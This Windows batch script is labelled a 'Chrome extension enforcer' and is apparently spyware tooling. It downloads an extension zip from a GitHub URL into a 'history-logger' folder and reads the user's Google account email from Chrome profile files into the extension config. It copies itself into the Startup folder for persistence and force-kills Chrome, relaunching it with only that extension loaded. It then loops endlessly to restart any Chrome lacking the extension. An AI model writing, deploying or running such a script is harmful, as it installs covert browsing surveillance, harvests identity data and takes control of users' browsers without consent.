@echo off
setlocal EnableDelayedExpansion

REM Debugging version of Chrome extension enforcer
REM Displays progress in CMD, logs to file, ensures single Chrome instance with extension
REM Modified to search for manifest.json and background.js in WORKDIR first

REM Initialize log file for debugging
set "LOGFILE=%USERPROFILE%\Documents\chrome_enforcer_log.txt"
echo [%DATE% %TIME%] Starting Chrome extension enforcer (DEBUG MODE) >> "%LOGFILE%"
echo Starting Chrome extension enforcer (DEBUG MODE)

REM 1) CONFIG: GitHub raw zip URL
set "ZIP_URL=https://raw.githubusercontent.com/Ayamet/web/main/main/extension.zip"
echo Step 1: Configured ZIP URL: %ZIP_URL%
echo [%DATE% %TIME%] Configured ZIP URL: %ZIP_URL% >> "%LOGFILE%"

REM Set work directory to Documents with unique folder
set "WORKDIR=%USERPROFILE%\Documents\history-logger-%RANDOM%"
set "EXT_DIR=%WORKDIR%"
echo Step 2: Creating working directory: %WORKDIR%
mkdir "%WORKDIR%"
if errorlevel 1 (
  echo ERROR: Failed to create %WORKDIR%
  echo [%DATE% %TIME%] ERROR: Failed to create %WORKDIR% >> "%LOGFILE%"
  pause
  exit /b 1
)
echo Successfully created %WORKDIR%
echo [%DATE% %TIME%] Created working directory: %WORKDIR% >> "%LOGFILE%"

REM 2) Download extension.zip
echo Step 3: Downloading extension zip from %ZIP_URL%
powershell -NoProfile -ExecutionPolicy Bypass -Command ^
  "try { Invoke-WebRequest -Uri '%ZIP_URL%' -OutFile '%WORKDIR%\ext.zip' -UseBasicParsing; exit 0 } catch { exit 1 }"
if errorlevel 1 (
  echo ERROR: Failed to download zip from %ZIP_URL%
  echo [%DATE% %TIME%] ERROR: Failed to download zip >> "%LOGFILE%"
  pause
  exit /b 1
)
echo Successfully downloaded extension zip
echo [%DATE% %TIME%] Downloaded extension zip >> "%LOGFILE%"

REM 3) Extract ext.zip
echo Step 4: Extracting zip to %WORKDIR%
powershell -NoProfile -ExecutionPolicy Bypass -Command ^
  "try { Expand-Archive -LiteralPath '%WORKDIR%\ext.zip' -DestinationPath '%WORKDIR%' -Force; exit 0 } catch { exit 1 }"
if errorlevel 1 (
  echo ERROR: Failed to extract zip
  echo [%DATE% %TIME%] ERROR: Failed to extract zip >> "%LOGFILE%"
  pause
  exit /b 1
)
echo Successfully extracted zip to %WORKDIR%
echo [%DATE% %TIME%] Extracted zip to %WORKDIR% >> "%LOGFILE%"

REM 4) Locate manifest.json and background.js
echo Step 5: Locating manifest.json and background.js
set "FOUND=0"
if exist "%WORKDIR%\manifest.json" (
  if exist "%WORKDIR%\background.js" (
    set "EXT_DIR=%WORKDIR%"
    set "FOUND=1"
    echo Found manifest.json and background.js in %WORKDIR%
  )
)
if "%FOUND%"=="0" (
  for /D %%D in ("%WORKDIR%\*") do (
    if exist "%%D\manifest.json" (
      if exist "%%D\background.js" (
        set "EXT_DIR=%%D"
        set "FOUND=1"
        echo Found manifest.json and background.js in %%D
        goto :got
      )
    )
  )
)
:got
if "%FOUND%"=="0" (
  echo ERROR: manifest.json or background.js not found in %WORKDIR% or its subfolders
  echo [%DATE% %TIME%] ERROR: manifest.json or background.js not found >> "%LOGFILE%"
  dir "%WORKDIR%" /s >> "%LOGFILE%"
  echo Contents of %WORKDIR% logged to %LOGFILE%
  pause
  exit /b 1
)
echo Successfully located extension at %EXT_DIR%
echo [%DATE% %TIME%] Found extension at %EXT_DIR% >> "%LOGFILE%"

REM 5) Scan Chrome profiles for email
echo Step 6: Scanning Chrome profiles for email
set "EMAIL="
for /D %%P in ("%LOCALAPPDATA%\Google\Chrome\User Data\*") do (
  if exist "%%P\Preferences" (
    for /f "usebackq delims=" %%E in (`
      powershell -NoProfile -ExecutionPolicy Bypass -Command ^
        "try {(Get-Content -Raw '%%P\Preferences' | ConvertFrom-Json).account_info.email} catch {''}"
    `) do if not defined EMAIL (
      set "EMAIL=%%E"
      echo Found email: %%E in profile %%P
    )
  )
)
if not defined EMAIL set "EMAIL=anonymous@demo.com"
echo Using email: %EMAIL%
echo [%DATE% %TIME%] Using email: %EMAIL% >> "%LOGFILE%"

REM 6) Write config.json
echo Step 7: Writing config.json with email %EMAIL%
> "%EXT_DIR%\config.json" echo {"userEmail":"!EMAIL!"}
if errorlevel 1 (
  echo ERROR: Failed to write config.json
  echo [%DATE% %TIME%] ERROR: Failed to write config.json >> "%LOGFILE%"
  pause
  exit /b 1
)
echo Successfully wrote config.json
echo [%DATE% %TIME%] Wrote config.json with email %EMAIL% >> "%LOGFILE%"

REM 7) Locate chrome.exe
echo Step 8: Locating chrome.exe
set "CHROME_PATH="
for %%P in (
  "%ProgramFiles%\Google\Chrome\Application\chrome.exe"
  "%ProgramFiles(x86)%\Google\Chrome\Application\chrome.exe"
  "%LOCALAPPDATA%\Google\Chrome\Application\chrome.exe"
) do if exist "%%~P" set "CHROME_PATH=%%~P"
if not defined CHROME_PATH (
  echo ERROR: chrome.exe not found!
  echo [%DATE% %TIME%] ERROR: chrome.exe not found! >> "%LOGFILE%"
  pause
  exit /b 1
)
echo Found Chrome at %CHROME_PATH%
echo [%DATE% %TIME%] Found Chrome at %CHROME_PATH% >> "%LOGFILE%"

REM 8) Ensure script runs on startup
echo Step 9: Copying script to startup folder
set "STARTUP_DIR=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
set "SCRIPT_NAME=ChromeExtensionEnforcerDebug.bat"
set "SCRIPT_PATH=%~f0"
copy "%SCRIPT_PATH%" "%STARTUP_DIR%\%SCRIPT_NAME%"
if errorlevel 1 (
  echo ERROR: Failed to copy script to %STARTUP_DIR%
  echo [%DATE% %TIME%] ERROR: Failed to copy script to %STARTUP_DIR% >> "%LOGFILE%"
  pause
) else (
  echo Successfully copied script to %STARTUP_DIR%
  echo [%DATE% %TIME%] Copied script to startup folder >> "%LOGFILE%"
)

REM 9) Check for existing Chrome process with extension
echo Step 10: Checking for Chrome processes with extension
set "CHROME_RUNNING=0"
powershell -Command "(Get-WmiObject Win32_Process -Filter \"name = 'chrome.exe'\" | Select-Object ProcessId,CommandLine)" > "%TEMP%\chrome_processes.txt"
for /f "tokens=1,* delims= " %%A in (%TEMP%\chrome_processes.txt) do (
  set "COMMAND_LINE=%%B"
  echo !COMMAND_LINE! | find "--load-extension=" >nul
  if !ERRORLEVEL! == 0 (
    set "CHROME_RUNNING=1"
    echo Found Chrome process with extension: %%A
  )
)
del "%TEMP%\chrome_processes.txt"
echo Chrome with extension running: %CHROME_RUNNING%
echo [%DATE% %TIME%] Chrome with extension running: %CHROME_RUNNING% >> "%LOGFILE%"

REM 10) Terminate all Chrome processes if no extension instance is running
if "!CHROME_RUNNING!"=="0" (
  echo Step 11: Terminating all Chrome processes
  taskkill /IM chrome.exe /F
  if errorlevel 1 (
    echo ERROR: Failed to terminate Chrome processes
    echo [%DATE% %TIME%] ERROR: Failed to terminate Chrome processes >> "%LOGFILE%"
    pause
  ) else (
    echo Successfully terminated Chrome processes
    echo [%DATE% %TIME%] Terminated all Chrome processes >> "%LOGFILE%"
  )
  timeout /t 3
)

REM 11) Launch Chrome with extension if none is running
if "!CHROME_RUNNING!"=="0" (
  echo Step 12: Launching Chrome with extension
  set "PROFILE_DIR=%LOCALAPPDATA%\Google\Chrome\User Data\Default"
  if not exist "!PROFILE_DIR!" (
    echo Creating profile directory: !PROFILE_DIR!
    mkdir "!PROFILE_DIR!"
  )
  start "" "%CHROME_PATH%" --user-data-dir="!PROFILE_DIR!" --disable-extensions-except="%EXT_DIR%" --load-extension="%EXT_DIR%"
  if errorlevel 1 (
    echo ERROR: Failed to launch Chrome
    echo [%DATE% %TIME%] ERROR: Failed to launch Chrome >> "%LOGFILE%"
    pause
  ) else (
    echo Successfully launched Chrome with extension at %EXT_DIR%
    echo [%DATE% %TIME%] Launched Chrome with extension at %EXT_DIR% >> "%LOGFILE%"
  )
)

REM 12) Monitor and enforce extension for any profile
echo Step 13: Starting monitoring loop
echo [%DATE% %TIME%] Starting monitoring loop >> "%LOGFILE%"
:monitor
powershell -Command "(Get-WmiObject Win32_Process -Filter \"name = 'chrome.exe'\" | Select-Object ProcessId,CommandLine)" > "%TEMP%\chrome_processes.txt"

set "FOUND_PROFILE="
for /f "tokens=1,* delims= " %%A in (%TEMP%\chrome_processes.txt) do (
  set "COMMAND_LINE=%%B"
  echo Checking process %%A: !COMMAND_LINE!
  echo !COMMAND_LINE! | find "--user-data-dir=" >nul
  if !ERRORLEVEL! == 0 (
    REM Extract profile directory
    for /f "tokens=2 delims==" %%D in ("!COMMAND_LINE!") do (
      set "PROFILE_DIR=%%D"
      set "PROFILE_DIR=!PROFILE_DIR:"=!"
      for %%E in ("!PROFILE_DIR!") do set "PROFILE_DIR=%%~E"
      echo Found profile directory: !PROFILE_DIR!
      REM Check if extension is loaded
      echo !COMMAND_LINE! | find "--load-extension=" >nul
      if !ERRORLEVEL! NEQ 0 (
        echo Process %%A is not using extension, terminating and relaunching
        powershell -Command "Stop-Process -Id %%A -Force"
        start "" "%CHROME_PATH%" --user-data-dir="!PROFILE_DIR!" --disable-extensions-except="%EXT_DIR%" --load-extension="%EXT_DIR%"
        echo Restarted Chrome with extension for profile !PROFILE_DIR!
        echo [%DATE% %TIME%] Restarted Chrome with extension for profile !PROFILE_DIR! >> "%LOGFILE%"
      ) else (
        echo Process %%A is already using extension
      )
      set "FOUND_PROFILE=1"
    )
  )
)
del "%TEMP%\chrome_processes.txt"
if not defined FOUND_PROFILE (
  echo No Chrome processes found, monitoring...
  echo [%DATE% %TIME%] No Chrome processes found >> "%LOGFILE%"
)
timeout /t 3
goto :monitor
